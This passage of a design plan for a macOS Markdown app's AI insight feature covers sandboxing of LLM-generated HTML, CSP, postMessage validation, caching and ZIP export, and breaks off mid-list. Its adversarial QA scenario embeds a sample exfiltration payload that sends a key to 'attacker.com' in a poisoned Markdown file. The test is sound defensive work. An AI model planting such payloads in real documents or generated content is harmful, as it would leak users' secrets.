// MarkView/Models/InsightArchiveExporter.swift (NEW)

struct InsightArchiveExporter {
    static func bundle(stagingURL: URL, to destinationURL: URL) async throws
    // Spawns /usr/bin/zip -r <dest>.tmp .
    // Atomic move .tmp → destinationURL on success
    // Cleans up tmp on failure
}

// MarkView/Models/AIProviderClient.swift (additive)

extension AIProviderClient {
    func toolCall(
        name: String,
        description: String,
        inputSchema: [String: Any],
        systemPrompt: String,
        userMessage: String,
        model: String = "claude-sonnet-4-6",
        maxTokens: Int = 8192
    ) async throws -> [String: Any]  // returns the tool_use input dict
}
```

## Dependencies

### New packages

None. Foundation + WebKit + Process suffice.

### New vendored assets

- **Chart.js 4.4.x minified** — placed at `MarkView/Resources/Editor/vendor/js/chart-4.4.x.min.js`. Source: cdn.jsdelivr.net. SHA-256 verified at vendor time and recorded in `Resources/Editor/vendor/MANIFEST.txt`.

### Using existing (from v1 / project)

- `AIProviderClient.streamCompletion`, `extractSingleChunk`, `apiKeySnapshot`, `AIProviderError`, `sanitize` — kept as-is
- `TabKind` enum + `OpenTab.kind` — unchanged
- `WorkspaceManager.startRecursiveInsight`, `closeTab` insight branch (with cache cleanup added), 5 forwarders (signatures adapt), `scanMarkdownFiles`, `hasMarkdownFiles`, the 9 disk-write guards — kept
- `GraphRAG.detectCommunities`, `escapeXMLEnvelopeBreakout`, `xmlAttrSafeCharacters`, `mapReduceForFolder` (body replaced) — kept
- `WebViewBridge` JSON encoding helper, dispatch infrastructure, `WebViewBridgeDelegate` protocol (extended) — kept
- `EditorView.Coordinator` + Combine subscription pattern — kept (subscriptions retargeted)
- `ContentView` AI Tools menu button — unchanged
- Mermaid (existing in `Resources/Editor/vendor/`), KaTeX (existing), Prism (existing) — version-pin in MANIFEST.txt
- `/usr/bin/zip` (macOS system binary)
- `FileManager.enumerator`, `FileManager.copyItem`, `FileManager.removeItem`, atomic `URL.write(_:options:.atomic)`

## Testing Strategy

**Feature size:** L

### Unit tests
None for this feature. Same rationale as v1 Decision 9 — XCTest target absent in the project.

### Integration tests
None. Same reason.

### E2E tests
None. Same reason.

### Compensating verification
- **Build cleanness:** `xcodebuild -project MarkView.xcodeproj -scheme MarkView -configuration Debug build` must succeed with 0 errors and 0 new warnings in modified files.
- **Manual smoke flow** by user (see Agent Verification Plan).
- **Audit Wave** (T9 code-reviewer + T10 security-auditor + T11 test-master) reads all v2 source files and writes structured reports.
- **Reviewer hand-trace** against committed reference data:
  - Existing `Tests/Fixtures/sse-anthropic-sample.txt` (v1) for streamCompletion.
  - **NEW** `Tests/Fixtures/insight-skeleton-sample.json` — example tool_use response for Phase 1 (committed in Task 1 or Task 4).
  - Marker fixtures from v1 (`Tests/Fixtures/marker-cases/*.md`) become irrelevant in v2; can be removed by Task 8 cleanup or left in for future reference.

## Agent Verification Plan

### Verification approach

The agent verifies build correctness, smoke endpoint, and static checks via grep. The user verifies behavior in the running app via the manual smoke flow.

### Verification steps

| Step | Tool | Expected |
|------|------|----------|
| Project builds clean | `xcodebuild -project MarkView.xcodeproj -scheme MarkView -configuration Debug build` | BUILD SUCCEEDED, 0 errors, 0 new warnings in modified files |
| Anthropic tool_use endpoint smoke | `curl -N -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" -d '{"model":"claude-sonnet-4-6","max_tokens":256,"tools":[{"name":"echo","description":"echo back","input_schema":{"type":"object","properties":{"text":{"type":"string"}},"required":["text"]}}],"messages":[{"role":"user","content":"call echo with text=hello"}]}' https://api.anthropic.com/v1/messages` | Response contains `tool_use` block with `input.text == "hello"` |
| Chart.js vendored + verified | `ls MarkView/Resources/Editor/vendor/js/chart-*.min.js && shasum -a 256 MarkView/Resources/Editor/vendor/js/chart-*.min.js` | File present; SHA matches MANIFEST.txt entry |
| Iframe sandbox attribute | `grep -E 'sandbox="allow-scripts"' MarkView/Resources/Editor/index.html` | match present, NO occurrences of `allow-same-origin` in insight-mode |
| Defense-in-depth frameInfo guard | `grep -n 'frameInfo.isMainFrame' MarkView/Bridge/WebViewBridge.swift` | guard present in all v2 message handlers |
| postMessage allowlist | `grep -E 'insightIframeReady\|insightDeepDiveClicked\|insightBreadcrumbClicked\|insightRequestSave\|insightRequestUp' MarkView/Resources/Editor/index.html` | exactly 5 types, no others |
| CSP in iframe srcdoc | `grep -E 'connect-src .none.' MarkView/Resources/Editor/index.html` | match present in iframe template |

### Tools required

- `xcodebuild` (Xcode 15+, already required)
- `curl` (one-time smoke for tool_use endpoint)
- `shasum` (lib integrity verification)

No Playwright, no Telegram, no Docker. Desktop macOS app, manual UI verification only.

## Risks

| Risk | Mitigation |
|------|-----------|
| WKWebView iframe sandbox may auto-inject `webkit.messageHandlers` (untested without spike per user opt-out) | Defense-in-depth `frameInfo.isMainFrame` guard in all v2 bridge handlers (Decision 3) + parent JS `event.source === iframe.contentWindow && event.origin === 'null'` validation. Manual smoke during QA: poison a `.md` file → run insight → check no spurious bridge calls reach Swift. If WebKit semantics surprise us, rework constrains WKWebViewConfiguration to disable per-frame bridge inheritance. |
| Anthropic tool_use returns malformed input (vanishingly rare, but possible) | Defensive parser produces "single prose section" fallback InsightSkeleton on parse failure; logs warning; user still sees content (just less structured). |
| Phase 2 N parallel calls hit Anthropic rate limit | Cap concurrent at 5 (gated scheduling in withThrowingTaskGroup, pattern from GraphRAG v1 round-1 fix). On 429 from one section: that section enters `.failed` with "rate limit, retry"; other sections continue. |
| Pre-bundled libs distribution: KaTeX webfonts in iframe blob context | Validate during T5; if blob URL doesn't carry fonts, base64-inline `.woff2` files in srcdoc. |
| Disk cache fills (50 nodes × 500KB = 25MB per session) | Per-session cleanup on tab close (Decision 4). Per-node 2MB cap (resource cap). Per-session disk usage logged at close. Global cap deferred — log only this version. |
| App crash mid-session leaves stale cache | Cache directories named with session UUIDs; at next session start, ignore prior session dirs (don't reuse). Manual cleanup via `find ~/.../.insight-cache -mtime +7 -delete` if user wants. Documented in known-issues. |
| ZIP export fails (zip binary missing — extreme edge case) | `Process` exit code captured; non-zero → NSAlert "ZIP export failed: <stderr>". `/usr/bin/zip` is macOS standard. |
| LLM-generated section HTML embeds `<script>` requesting CDN (sandbox blocks fetch but the attempt happens) | CSP within iframe srcdoc: `connect-src 'none'; script-src 'self' 'unsafe-inline' blob:` — script-src allows blob (for our libs); connect-src 'none' blocks fetch/XHR/EventSource/WebSocket. Defense-in-depth on top of sandbox null-origin. |
| LLM-generated HTML triggers infinite loop / spam alerts | Sandbox blocks `alert()` (no allow-modals). Infinite loop blocks JS thread within iframe only — parent UI remains responsive. User can close tab. Iframe load timeout (10s) → if `insightIframeReady` not received, parent shows "iframe failed to load" error. |
| Tab close while phases in flight | session.cancel() cancels all parallel section tasks (cooperative cancellation, observed at next stream chunk); awaits pending writes; cache.cleanup; tabsStore.removeTab. ARC frees iframe + session. |
| Stale cache from previous app crash | At session start, `cache.init` creates a fresh directory using current sessionUUID; old dirs are not reused or read. Periodic GC of `.insight-cache/` deferred. |
| Tests deferred — v2 surface larger than v1 | Audit Wave + manual QA + Instruments leak check. Follow-up task in `tasks/todo.md` expanded with v2-specific paths (Decision 9). T8 explicitly performs the `tasks/todo.md` rewrite (removes dead v1 modules, adds v2 paths). T12 adds 4 adversarial scenarios beyond happy-path. |
| Cache cleanup races in-flight Phase 2 writes | `closeTab` insight branch awaits a synchronous flush flag from `cache.cleanup`: `await session.cancel()` (which awaits all section tasks to observe Task.isCancelled and exit), THEN `try? cache.cleanup()`, THEN `tabsStore.removeTab`. If a write was mid-flight, it completes via the `.tmp` file but the rename is skipped (cleanup also removes orphan `.tmp` files). |
| In-flight ZIP `Process` not cancelled on tab close | `InsightArchiveExporter.bundle` runs as a separate Task; `session.cancel()` cancels it; on cancel, the task spawns a final cleanup of the staging temp dir + any partial `.zip.tmp` at user destination. |
| Blob URL revocation missed on tab close | Decision 11 §2: `closeTab` insight branch calls parent JS `window.releaseInsightBlobs()` BEFORE `session.cancel()`. Acceptance criterion enforces. |
| Vendored libs CVE/dependency check | One-time at vendor: `npm audit` or manual GitHub security advisories check. Recorded in `vendor/MANIFEST.txt` with date + result. Re-checked when libs are bumped. |
| Iframe load timeout — iframe never sends `insightIframeReady` | 10s parent timer. On expiry: setInsightError("iframe load failed, retry"), destroy + recreate iframe empty. Documented in Acceptance Criteria. |
| Parent JS chrome (breadcrumbs / status bar) renders LLM strings via textContent (sandbox does not protect chrome) | Decision 10 mandates escape utility. Acceptance Criterion audits all interpolation sites. |
| ARC retain cycle from new InsightCache reference | InsightSession holds `cache` strongly (not weak — cache outlives session use); cache holds no reference to session. `[weak self]` in all session closures (preserved from v1). |

## Acceptance Criteria

Technical acceptance (in addition to user-spec criteria):

**Build & compatibility:**
- [ ] `xcodebuild -configuration Debug build` succeeds with 0 errors
- [ ] No new compiler warnings introduced in modified files
- [ ] All v1 integration seams still functional (TabKind, startRecursiveInsight, closeTab insight branch, ContentView menu button)
- [ ] No regression: editor / AI Console / Translate / Git / existing AI Tools all work
- [ ] No new SQLite tables created; no writes to existing artifacts/ai_jobs from v2 operations
- [ ] V1 follow-up TODO in `tasks/todo.md` updated with v2-specific paths

**Phase 1 / skeleton:**
- [ ] `AIProviderClient.toolCall` correctly invokes Anthropic Messages API with `tools` field; parses tool_use response into a dict
- [ ] On schema validation failure (defensive parser), produces fallback InsightSkeleton with single prose section
- [ ] `InsightSession.phase1Skeleton` returns within 3s for typical folder (10 .md files); errors propagated to `handleStreamError`
- [ ] `EditorView` Combine subscription `$skeleton` triggers `bridge.loadInsightSkeleton`
- [ ] Iframe srcdoc with skeleton placeholders renders within 100ms of receiving skeleton
- [ ] Iframe posts `insightIframeReady` to confirm load; status bar updates

**Phase 2 / streaming:**
- [ ] N parallel `streamCompletion` calls (one per section), capped at 5 concurrent
- [ ] Each section's `onDelta` chunk forwarded via `bridge.updateInsightSection(sectionId:, htmlChunk:)`
- [ ] Iframe receives via `postMessage`, finds placeholder, appends content
- [ ] Sections fill independently — visible as parallel progress
- [ ] When section completes, JS initializes corresponding lib (Mermaid render, Chart.js draw, KaTeX render)
- [ ] All sections complete → `session.allSectionsReady = true`; cache write triggered

**Iframe sandbox security (Decisions 2 + 3 + 10 + 11):**
- [ ] iframe srcdoc element has `sandbox="allow-scripts"` exactly (no allow-same-origin, no allow-popups, no allow-forms, no allow-modals, no allow-top-navigation)
- [ ] iframe srcdoc CSP meta has: `default-src 'none'; script-src 'unsafe-inline' blob:; style-src 'unsafe-inline'; connect-src 'none'; img-src data: blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` (note: `'self'` is meaningless in null-origin frame so removed; `'unsafe-inline'` accepted as the LLM is intentionally trusted to provide inline JS within sandbox boundary; defense remains: sandbox null-origin + connect-src 'none' + no allow-same-origin)
- [ ] Every WebViewBridge handler for v2 message types has `guard message.frameInfo.isMainFrame else { return }` at entry
- [ ] Parent JS `window.addEventListener('message', handler)` validates `event.source === iframe.contentWindow` AND `event.origin === 'null'` (sandbox iframe origin) — rejects other sources
- [ ] postMessage allowlist exactly 5 types: insightIframeReady, insightDeepDiveClicked, insightBreadcrumbClicked, insightRequestSave, insightRequestUp
- [ ] Each type's payload schema validated parent-side; malformed payloads rejected with NSLog warning (sanitized)
- [ ] `insightDeepDiveClicked` validates: `sectionId` is a known id in current skeleton; `topicIndex` is within bounds of `skeleton.sections[sectionId].deepDiveTopics`
- [ ] `insightBreadcrumbClicked` validates: `nodeId` matches UUID regex; `nodeId` is present in session manifest (`session.nodes[uuid]` exists); reject otherwise

**HTML-escape policy (Decision 10):**
- [ ] Single utility `escapeForHTMLAttribute(_:)` and `escapeForHTMLText(_:)` exist in parent JS (and equivalent Swift helpers if used during HTML build)
- [ ] Used at every interpolation of LLM-controlled strings: skeleton.title, section.title, deepDiveTopic.label/hint, scopeHint paths, error messages, node.title in breadcrumbs, exported ZIP HTML
- [ ] Audit: grep for `${...}` template-string interpolations of LLM strings — every one must go through escape utility
- [ ] Exported ZIP `index.html` and `nodes/*.html` go through the same escape pipeline

**LLM CDN injection sanitization (runtime enforcement):**
- [ ] In `bridge.updateInsightSection`, parent strips any `<script src="https://...">` (and `src="http://"`, `src="//..."`) from htmlChunk BEFORE forwarding to iframe via postMessage. Replaces with HTML comment `<!-- script src stripped: <url> -->` for visibility. CSP `connect-src 'none'` is defense-in-depth, not the only barrier.
- [ ] Strip also: `<link rel="prefetch">`, `<link rel="preconnect">`, `<link rel="dns-prefetch">` to prevent DNS leak.

**Blob URL lifecycle (Decision 11):**
- [ ] `URL.createObjectURL` called lazily based on skeleton section types
- [ ] On node navigation (currentNodeId change): unused libs revoked, new libs created
- [ ] On `closeTab` insight branch: parent JS `window.releaseInsightBlobs()` called BEFORE `session.cancel()`; revokes ALL session blob URLs

**Iframe load timeout:**
- [ ] After parent sets iframe.srcdoc, parent starts a 10-second timer. If `insightIframeReady` not received → parent shows error "iframe load failed" via setInsightError; iframe is destroyed and recreated empty.

**Disk cache (Decision 4):**
- [ ] On Phase 2 completion, full HTML (parent-built deterministically from skeleton + section buffers + chrome) written atomically to `<workspace>/.insight-cache/<sessionUUID>/nodes/<nodeUUID>.html`
- [ ] `manifest.json` updated atomically with new node entry
- [ ] `_assets/` directory created at session start with copies of all vendored libs
- [ ] `navigateTo(nodeId:)` reads from cache, returns within 100ms (no LLM call)
- [ ] On `closeTab` insight branch, `try? session.cache.cleanup()` removes session dir
- [ ] App crash mid-session: next session start uses fresh sessionUUID; stale dir from prior session ignored

**ZIP export (Decision 7):**
- [ ] `InsightArchiveExporter.bundle` builds staging dir with: index.html (root, deep-dive onclicks rewritten to relative `<uuid>.html`), nodes/<uuid>.html for each (same rewriting + lib refs to `../_assets/`), `_assets/` with libs, `manifest.json`
- [ ] `/usr/bin/zip -r <destination>.tmp .` exits 0; atomic move to user-selected URL
- [ ] Opening the exported ZIP's `index.html` in Safari renders correctly; breadcrumb navigation between local files works

**Pre-bundled libs (Decision 5):**
- [ ] `Chart.js 4.4.x` vendored in `MarkView/Resources/Editor/vendor/js/`; SHA-256 in `vendor/MANIFEST.txt` matches `shasum -a 256` of file
- [ ] At runtime, parent loads each lib once at session start; creates blob URL via `URL.createObjectURL`
- [ ] Iframe srcdoc references `<script src="blob:...">` for libs (lazy: Mermaid only loaded if any section.type == .mermaidDiagram)
- [ ] No CDN URLs (`https://cdn.jsdelivr.net`, `https://cdnjs.cloudflare.com`, etc.) appear in any LLM-generated content
- [ ] If grep shows CDN URL in LLM output: parent strips and replaces with blob URL (or rejects section as malformed)

**Lifecycle (preserved v1 patterns):**
- [ ] All long-lived closures captured by activeTask use `[weak self]` (audited)
- [ ] `cancel()` cancels activeTask + all parallel section tasks before any further state mutation
- [ ] `handleStreamError(_:forNodeId:)` uses pattern table for all `AIProviderError` cases (matches v1 round-2 fix)
- [ ] Retry throttle: 3 retries / 60s sliding window per node; `lastErrorRetryable` propagated to bridge
- [ ] Tab-switch-during-stream: session continues, iframe stays alive, switching back shows current state intact
- [ ] No retain cycles: closing insight tab → InsightSession + InsightCache + iframe deallocated (verified by Instruments in Pre-deploy QA)

**Resource caps (preserved v1):**
- [ ] Per-file 50 KB truncation (in prompt context for LLM, applied via existing GraphRAG.escapeXMLEnvelopeBreakout pipeline)
- [ ] Per-folder 500 file cap (rejection at scanMarkdownFiles, unchanged from v1)
- [ ] Per-node final HTML cap 2 MB (cancel + .failed if exceeded; surfaced via setInsightError)
- [ ] Per-session disk cache logged at session close; global cap deferred
- [ ] Per-SSE line 64 KB + per-event 1 MB (inherited from AIProviderClient v1 round-1 fix)
- [ ] Phase 2 parallelism cap exactly 5 concurrent

## Implementation Tasks

### Wave 1 (independent foundations)

#### Task 1: AIProviderClient.toolCall (Anthropic tool_use)
- **Description:** Add `toolCall(name:description:inputSchema:systemPrompt:userMessage:model:maxTokens:)` method to `AIProviderClient` using Anthropic Messages API with `tools` field. Returns the parsed tool_use input dict on success. Reuses existing `apiKey`, headers, error sanitize. First structured-output code path in the codebase. Commit a sample tool_use response in `Tests/Fixtures/insight-skeleton-sample.json` for code-reviewer hand-trace.
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Verify-smoke:** `curl -N -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01" -H "content-type: application/json" -d '{"model":"claude-sonnet-4-6","max_tokens":256,"tools":[{"name":"echo","description":"echo back","input_schema":{"type":"object","properties":{"text":{"type":"string"}},"required":["text"]}}],"messages":[{"role":"user","content":"call echo with text=hello"}]}' https://api.anthropic.com/v1/messages` → response contains tool_use block with `input.text == "hello"`
- **Files to modify:** `MarkView/Models/AIProviderClient.swift`, `Tests/Fixtures/insight-skeleton-sample.json` (new)
- **Files to read:** `MarkView/Models/AIProviderClient.swift` (existing patterns: extractSingleChunk request shape, streamCompletion sanitize, AIProviderError cases)

#### Task 2: Vendor Chart.js 4.x + libs MANIFEST
- **Description:** Download Chart.js 4.4.x minified from `cdn.jsdelivr.net/npm/chart.js@4.4` into `MarkView/Resources/Editor/vendor/js/chart-4.4.x.min.js`. Compute SHA-256, record in new `MarkView/Resources/Editor/vendor/MANIFEST.txt` along with existing Mermaid + KaTeX + Prism versions and SHAs. Note CVE check date and result for each lib. Register the new file in Xcode project's Sources build phase so it's copied into app bundle. Verify-smoke: `shasum -a 256 MarkView/Resources/Editor/vendor/js/chart-*.min.js` matches MANIFEST.txt entry.
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Files to modify:** `MarkView/Resources/Editor/vendor/js/chart-4.4.x.min.js` (new), `MarkView/Resources/Editor/vendor/MANIFEST.txt` (new), `MarkView.xcodeproj/project.pbxproj`
- **Files to read:** `MarkView/Resources/Editor/index.html` (existing vendored lib references), `MarkView/Resources/Editor/vendor/` directory listing

#### Task 3: InsightCache module (disk CRUD + manifest)
- **Description:** Create `MarkView/Models/InsightCache.swift` with struct providing per-session disk cache. Init creates `<workspace>/.insight-cache/<sessionUUID>/` + `_assets/` (copies vendored libs into _assets via FileManager.copyItem). Methods: writeNode/readNode atomic via temp+rename, updateManifest/loadManifest atomic, cleanup removes session dir, archiveStagingDirectory prepares for /usr/bin/zip. Path validation per Decision 10 §6 v1 (resolvingSymlinksInPath().standardizedFileURL containment).
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Files to modify:** `MarkView/Models/InsightCache.swift` (new)
- **Files to read:** `MarkView/Models/WorkspaceManager.swift` (existing scan helper for path validation patterns), `MarkView/Models/AIProviderClient.swift` (sanitize patterns), v1 `MarkView/Models/InsightSession.swift` archive at `work/recursive-insight-v1/` (eviction patterns)

### Wave 2 (depends on T1, T2)

#### Task 4: GraphRAG v2 prompts (skeleton + per-section)
- **Description:** Replace `mapReduceForFolder` body in GraphRAG.swift to support v2: phase 1 helper composes the skeleton system+user prompts with strict JSON schema instruction and calls `providerClient.toolCall` (T1) returning InsightSkeleton; phase 2 helper composes per-section prompts and exposes them for InsightSession to invoke `streamCompletion` in parallel. Existing `detectCommunities`, file body XML wrapping, `escapeXMLEnvelopeBreakout`, `xmlAttrSafeCharacters` reused. Existing `deepResearch()` untouched.
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Files to modify:** `MarkView/Models/GraphRAG.swift`
- **Files to read:** `MarkView/Models/GraphRAG.swift` (existing functions), `MarkView/Models/AIProviderClient.swift` (after T1)

#### Task 5: index.html v2 insight-mode (iframe + postMessage + skeleton + libs delivery + sanitization + escape)
- **Description:** Replace v1 insight-mode JS in `Resources/Editor/index.html` with v2: insight-mode container hosts a single `<iframe sandbox="allow-scripts">`. Parent JS handles `bridge.loadInsightSkeleton` (builds iframe srcdoc with skeleton placeholders + CSP meta + blob URLs for vendored libs — lazy lib materialization per Decision 5), `bridge.updateInsightSection` (per Decision 10: BEFORE forwarding chunk to iframe, parent strips `<script src="https://..."` / `<link rel="prefetch|preconnect|dns-prefetch"`; then posts message to iframe; iframe handler finds placeholder by sectionId, appends chunk, on completion initializes lib if needed). Iframe-side: `window.parent.postMessage` with 5 allowlisted types. Parent listens with `event.source === iframe.contentWindow && event.origin === 'null'` validation; per-type payload schema validation; forwards via existing bridge.postMessage idiom. Implement single `escapeForHTMLAttribute(_)` and `escapeForHTMLText(_)` utility (Decision 10) used at every interpolation of LLM-controlled strings into chrome (breadcrumbs, status bar) AND iframe srcdoc construction. Implement `window.releaseInsightBlobs()` (revokes all session blob URLs). Implement 10s iframe-load timeout with retry path. Breadcrumbs at top, status bar at bottom, 🤿 buttons inline.
- **Files to read:** `MarkView/Resources/Editor/index.html` (existing modes, vendored libs, mode switching), `Tests/Fixtures/insight-skeleton-sample.json` (after T1)
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Verify-user:** Open Web Inspector on running MarkView; manually call `window.loadInsightSkeleton(<sample skeleton from Tests/Fixtures/insight-skeleton-sample.json>)`; verify iframe renders with placeholders, libs blob URLs load, post a test deep-dive message → verify parent-side validation works.
- **Files to modify:** `MarkView/Resources/Editor/index.html`
- **Files to read:** `MarkView/Resources/Editor/index.html` (existing modes, vendored libs script tags, existing markdown-it `md` instance, mode switching), `Tests/Fixtures/insight-skeleton-sample.json` (after T1)

### Wave 3 (depends on T1, T3, T4)

#### Task 6: InsightSession.swift v2 rewrite
- **Description:** Full rewrite of `MarkView/Models/InsightSession.swift` for v2: new state (`skeleton`, `currentNodeSections`, `nodes` keyed by UUID), two-phase orchestration (generateRoot calls phase1Skeleton then phase2StreamSections in parallel via withThrowingTaskGroup capped at 5), cache integration (writeFinalHTMLToCache after Phase 2 completes; navigateTo reads from cache), retryCurrent supports both phases, statusMessage for status bar. Reuses [weak self] discipline, handleStreamError pattern table, retry throttle 3/60s, scope_hint validation, resource caps from v1.
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Files to modify:** `MarkView/Models/InsightSession.swift` (full rewrite)
- **Files to read:** v1 archive `work/recursive-insight-v1/tasks/4.md` (preserve v1 patterns: ARC, error handling, retry throttle, scope_hint, resource caps), `MarkView/Models/AIProviderClient.swift`, `MarkView/Models/GraphRAG.swift` (after T4), `MarkView/Models/InsightCache.swift` (after T3)

### Wave 4 (depends on T5, T6)

#### Task 7: WebViewBridge v2 protocol + EditorView routing
- **Description:** REPLACE v1's 5 Swift→JS commands and 5 JS→Swift handlers in WebViewBridge with v2 protocol. **5 new Swift→JS:** `loadInsightSkeleton(skeleton:into:)`, `updateInsightSection(sectionId:htmlChunk:into:)`, `setInsightError(message:retryable:into:)`, `setInsightStatus(message:phase:into:)`, `releaseInsightBlobs(into:)` — last one called by WorkspaceManager.closeTab insight branch (step 1 of 4 per Decision 11) and routes to parent JS `window.releaseInsightBlobs()`. **5 new JS→Swift handlers:** `insightIframeReady`, `insightDeepDiveClicked`, `insightBreadcrumbClicked`, `insightRequestSave`, `insightRequestUp`. Per Decision 3, all 5 JS→Swift handlers add `guard message.frameInfo.isMainFrame else { return }` at entry. EditorView.Coordinator updated: Combine subs to `session.$skeleton` (forward to loadInsightSkeleton), `session.$currentNodeSections` (per-section delta against `lastForwardedSectionLength[sectionId]`, forward to updateInsightSection), `session.$lastError` (forward to setInsightError with `session.lastErrorRetryable`), `session.$statusMessage` (forward to setInsightStatus). Old v1 subs (`$streamingBuffer`, `$currentNodeId`) removed.
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Files to modify:** `MarkView/Bridge/WebViewBridge.swift`, `MarkView/Views/EditorView.swift`
- **Files to read:** v1 `MarkView/Bridge/WebViewBridge.swift` (encodeStringForJS array-wrap idiom, dispatch pattern, delegate protocol), v1 `MarkView/Views/EditorView.swift` (routeInsight Combine pattern), `MarkView/Models/InsightSession.swift` (after T6 — published state surface)

### Wave 5 (depends on T6, T7)

#### Task 8: WorkspaceManager v2 wiring + ZIP export + tasks/todo.md update
- **Description:** Adapt 5 forwarders in `WorkspaceManager.swift` to new v2 bridge payloads (deepDiveClicked carries sectionId+topicIndex with bounds + manifest validation; breadcrumbClicked validates nodeId UUID + manifest membership; save now exports archive). Add ordered insight-cleanup in `closeTab` insight branch: parent JS `window.releaseInsightBlobs()` (via `bridge.releaseInsightBlobs(into:)` evaluateJavaScript) → `await session.cancel()` (awaits all parallel tasks) → `try? session.cache.cleanup()` → `tabsStore.removeTab`. Replace `saveInsightNode` with `exportInsightArchive(sessionId:)`: NSSavePanel (default `<folderName>_insight_<timestamp>.zip`); `cache.archiveStagingDirectory()` builds staging dir with deterministically-rebuilt HTML (per Decision 10 escape utility); `InsightArchiveExporter.bundle(stagingURL:to:)` spawns `/usr/bin/zip` via Process with explicit argument array (NEVER `/bin/sh -c` to avoid command injection); atomic move .zip.tmp → final URL on success. Process is cancellable: if user closes tab during export, in-flight Process killed + staging + .zip.tmp cleaned. Inherit all 9 v1 insight-tab disk-write guards unchanged. Add `MarkView/Models/InsightArchiveExporter.swift` (new). **Also:** rewrite `tasks/todo.md` to remove v1-only test scope (dead InsightMarkerParserTests, etc.) and add v2 paths (Anthropic tool_use parsing + skeleton schema + fallback, postMessage allowlist + payload schemas + frameInfo + event.source/origin defense, InsightCache atomic CRUD + manifest, ZIP export staging + HTML rewriting + escape policy, blob URL lifecycle, Phase 2 parallelism cap, iframe srcdoc CSP, iframe load timeout).
- **Skill:** code-writing
- **Reviewers:** code-reviewer, security-auditor, test-reviewer
- **Files to modify:** `MarkView/Models/WorkspaceManager.swift`, `MarkView/Models/InsightArchiveExporter.swift` (new), `MarkView/Views/EditorView.swift` (5 delegate stub bodies adapted to new payloads)
- **Files to read:** v1 `MarkView/Models/WorkspaceManager.swift` (5 forwarders, closeTab insight branch, 9 disk-write guards, sanitizeForLog), `MarkView/Models/GitClient.swift` (Process pattern for /usr/bin/zip)

### Audit Wave

#### Task 9: Code Audit
- **Description:** Holistic code quality audit across all v2 files: AIProviderClient.swift, InsightCache.swift, InsightArchiveExporter.swift, GraphRAG.swift, InsightSession.swift, WebViewBridge.swift, EditorView.swift, WorkspaceManager.swift, ContentView.swift, Resources/Editor/index.html, Resources/Editor/vendor/js/chart-4.4.x.min.js, Resources/Editor/vendor/MANIFEST.txt, Tests/Fixtures/insight-skeleton-sample.json. Verify shared resources compliance, Swift conventions, async error propagation, Task cancellation, **`[weak self]` discipline (per v1 audit critical lesson — flag any strong self capture)**, JS code quality, postMessage allowlist correctness, frameInfo defense-in-depth presence in all v2 handlers, hand-trace tool_use sample → InsightSkeleton parse, hand-trace ZIP staging dir construction. Write report `logs/audit/code-audit.md`.
- **Skill:** code-reviewing
- **Reviewers:** none

#### Task 10: Security Audit
- **Description:** Holistic security audit verifying Decision 2 (iframe sandbox attribute correct, no allow-same-origin), Decision 3 (frameInfo defense in all v2 handlers), Decision 5 (libs blob URL — no CDN tunneling — and no LLM-generated `<script src="https://...">` in section content). All v1 Decision 10 layers re-verified where they still apply: XML isolation in prompts (still in GraphRAG; **hand-trace escapeXMLEnvelopeBreakout** to confirm v1 round-3 fix not regressed), scope_hint validation, resource caps, API key redaction, insight-tab disk-write guards (9 paths from v1 — still present?), log injection. **Grep iframe-rendered JS for innerHTML/outerHTML/eval/Function/document.write** — note: these are ALLOWED inside iframe (LLM-generated, sandbox-isolated), but parent-side chrome (breadcrumbs, status bar) must use textContent. Verify postMessage allowlist exactly 5 types, payload schemas validated, `insightDeepDiveClicked.topicIndex` bounds-checked. Write report `logs/audit/security-audit.md`.
- **Skill:** security-auditor
- **Reviewers:** none

#### Task 11: Test Audit (v2-specific re-derivation)
- **Description:** Meta-audit. **Re-derive** from v2 architecture (NOT analogy from v1): tests deferred per Decision 9; verify `tasks/todo.md` follow-up scope FULLY rewritten by T8 with v2-specific paths (8 enumerated: tool_use parsing + skeleton schema + fallback, postMessage allowlist + payload schemas + frameInfo + event.source/origin defense, InsightCache atomic CRUD + manifest, ZIP export staging + HTML rewriting + escape policy, blob URL lifecycle, Phase 2 parallelism cap, iframe srcdoc CSP, iframe load timeout). Verify the v1-only modules listed in tasks/todo.md (e.g. InsightMarkerParserTests for the deleted marker parser) are REMOVED. Cross-check Code + Security audit reports for any path needing pre-merge tests despite deferral, considering v2 has 4 new risk classes (sandbox boundary, atomic write, ZIP path safety, parallel cap) that v1 didn't have. Verify T12 Pre-deploy QA's 9 Instruments scenarios cover new ARC surfaces (cache, exporter, iframe lifecycle, multi-session sequencing) plus 4 adversarial cases. Write report `logs/audit/test-audit.md`.
- **Skill:** test-master
- **Reviewers:** none

### Final Wave

#### Task 12: Pre-deploy QA
- **Description:** Acceptance testing for v2: build clean (xcodebuild Debug 0 errors, 0 new warnings in modified files); Anthropic tool_use endpoint smoke (curl per Verify-smoke); SHA-256 verify Chart.js against MANIFEST.txt; storage spot-check (no insight tables in `state.db`, no insight-prefix artifacts); static grep checks (iframe sandbox attribute, frameInfo guard in WebViewBridge, postMessage allowlist exactly 5 types, libs paths point to vendor/ not CDN, CSP meta in iframe template, escape utility used at all LLM-string interpolation sites). **Mandatory Instruments → Allocations leak check across 9 scenarios**: **happy path** — (a) open insight node + expand 2-3 + close, (b) error path (kill network mid Phase 2) + retry + close, (c) 4th retry within 60s rate-limit + close, (d) export ZIP archive + close, (e) navigate back via breadcrumb (cache load) + close. **Adversarial:** (f) poisoned `.md` file with embedded `<script>fetch("https://attacker.com/exfil?key="+...)</script>` and `</script><script>...` and `</label></section><script>` — verify (1) script does not execute in parent (sandbox blocks; chrome escape blocks); (2) connect-src 'none' blocks fetch attempts; (3) NSLog shows no exfil; (g) rapid double-click on a 🤿 deep-dive button — verify only one expansion fires (M1-class race resolved); (h) close tab during in-flight ZIP export — verify Process killed, staging dir + .zip.tmp cleaned, no partial file at user destination; (i) close tab during Phase 2 